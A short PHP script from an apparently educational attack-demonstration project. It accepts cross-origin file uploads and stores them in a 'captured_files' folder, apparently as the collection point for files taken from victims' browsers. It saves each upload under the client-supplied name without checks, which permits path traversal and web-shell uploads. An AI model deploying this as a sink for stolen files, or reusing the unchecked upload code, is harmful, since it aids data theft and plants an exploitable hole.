<?php
/**
 * Receive file uploads
 * @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 * @see http://blog.kotowicz.net
 *
 * THIS FILE IS PART OF THE PROJECT FOR EDUCATIONAL USE *ONLY*
 * ANY COMMERCIAL USE, E.G. FOR VULNERABILITY ASSESSMENT,
 * PENETRATION TESTING IS PROHIBITED - CONTACT THE AUTHOR FOR PERMISSION
 *
 * PERFORMING ACTUAL ATTACKS ON WEBSITES NOT OWNED BY YOU
 * USING THIS PROJECT IS PROHIBITED!
 */

// i'm CORS capable
//header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Max-Age: 999999");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    // preflight, skip
    die();
}

$file_storage = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'captured_files';

$response = false;
if (!empty($_FILES['contents'])) {  // process file upload
    if (move_uploaded_file($_FILES['contents']['tmp_name'], $file_storage . DIRECTORY_SEPARATOR . $_FILES['contents']['name'])) {
        $response = array('msg' => 'ok');
    } else {
        $response = array('msg' => 'error');
    }
}

// respond
header("Content-Type: application/json");
echo json_encode($response);
